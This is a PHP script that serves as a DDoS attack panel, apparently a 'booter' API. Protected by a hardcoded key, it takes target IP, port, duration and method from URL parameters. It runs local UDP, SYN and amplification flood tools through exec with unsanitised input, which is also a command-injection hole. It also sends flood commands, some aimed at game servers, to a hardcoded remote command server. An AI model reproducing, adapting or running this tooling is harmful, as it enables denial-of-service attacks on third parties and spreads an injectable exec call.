<?php

//THIS IS NOT A AUTHENTICATION SSH COMMAND SENDER.
//THIS HAS TO BE HOSTED ON THE SERVER YOU ARE GONNAH USE IT ON!

//STRINGS\\

if ($_GET['key'] != "JLSds834mJ234"){

    die("Pendejo.");
    
    }

$method = $_GET['method'];

$ip = $_GET['ip'];
$port = $_GET['port'];
$time = $_GET['time'];

$command = "";

//COMMANDS\\
if($method=='U'){ $command = "/usr/bin/python /var/www/html/attack.py $ip $port $time"; }
if($method=='REAP'){ $command = "/usr/bin/perl /var/www/html/reaper.pl $ip $port 9999 $time"; }
if($method=='QOTD-AMP'){ $command = "/var/www/html/qotd $ip $port qotd.txt 3 -1 $time"; }
if($method=='SIP-AMP'){ $command = "/var/www/html/sip $ip $port sip.txt 3 -1 $time"; }
if($method=='OVH'){ $command = "/var/www/html/ovhgame $ip $port 3 $time"; }
if($method=='IGDN-AMP'){ $command = "/var/www/html/Igdn $ip $port Igdn.txt 3 -1 $time"; }
if($method=='STOP'){ $command = "killall udp; killall python; killall perl"; }

//SENDING COMMAND\\
exec($command,$output,$return_var);

echo "Sent";

set_time_limit(0);

$socket = fsockopen("156.96.47.20", 8001);

($socket ? null : die("Not able to connect"));
   

        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;

        $port = preg_replace('/\D/', '', $port);

        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();

        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*60) ? (int)$_GET['time'] : 30;

        $time = preg_replace('/\D/', '', $time);

        $domain = $_GET['host'];

        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP))

        {

            die("Invalid Domain");

        }      

       
   

        if($_GET['method'] == "plain") {  fwrite($socket, "YourAPIKEYHere|.plain $ip $time dport=$port\n");                //Raw UDP
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with plain'; }
                if($_GET['method'] == "std") {  fwrite($socket, "YourAPIKEYHere|.std $ip $time dport=$port\n");                //Raw std
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with std'; }
                if($_GET['method'] == "R6-DROP") {  fwrite($socket, "YourAPIKEYHere|.plain $ip $time dport=$port\n");                //Raw std
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with plain'; }
            if($_GET['method'] == "BO4-DROP") {  fwrite($socket, "YourAPIKEYHere|.plain $ip $time dport=$port\n");                //Raw std
                echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with plain'; }
                if($_GET['method'] == "FN-FREEZE") {  fwrite($socket, "YourAPIKEYHere|.plain $ip $time dport=$port\n");                //Raw std
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with plain'; }
                if($_GET['method'] == "2k-DROP") {  fwrite($socket, "YourAPIKEYHere|.plain $ip $time dport=$port\n");                //Raw std
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with plain'; }
		        if($_GET['method'] == "syn") {  fwrite($socket, "YourAPIKEYHere|.syn $ip $time dport=$port\n");                //Raw syn
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with syn'; }
		        if($_GET['method'] == "raw") {  fwrite($socket, "YourAPIKEYHere|.raw $ip $time dport=$port\n");                //Raw UDP
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with raw'; }
                if($_GET['method'] == "lynx") {  fwrite($socket, "YourAPIKEYHere|.lynx $ip $time dport=$port\n");                //Raw lynx
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with lynx'; }
                if($_GET['method'] == "udphex") {  fwrite($socket, "YourAPIKEYHere|.udphex $ip $time dport=$port\n");                //Raw udphex
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with udphex'; }
                if($_GET['method'] == "udppush") {  fwrite($socket, "YourAPIKEYHere|.udppush $ip $time dport=$port\n");                //Raw udphex
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with udppush'; }
                if($_GET['method'] == "udprand") {  fwrite($socket, "YourAPIKEYHere|.udprand $ip $time dport=$port\n");                //Raw udphex
            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with udprand'; }
                if($_GET['method'] == "psh") {  fwrite($socket, "YourAPIKEYHere|.psh $ip $time dport=$port\n");                //Raw udphex
             echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with udphex'; } 
            if($_GET['method'] == "greip") {  fwrite($socket, "YourAPIKEYHere|.greip $ip $time dport=$port\n");                //Raw greip

            echo 'Attacking ' . $ip . ' ' . $port . ' ' . $time . ' with greip'; }
            
        elseif($_GET['method'] == "show") { fwrite($socket, "s\n");                                       //STOP ALL ATTACKS RUNNING

            echo 'Attack stopped.';  }

        echo "Successfully Sent Attack -> $command ";

?>
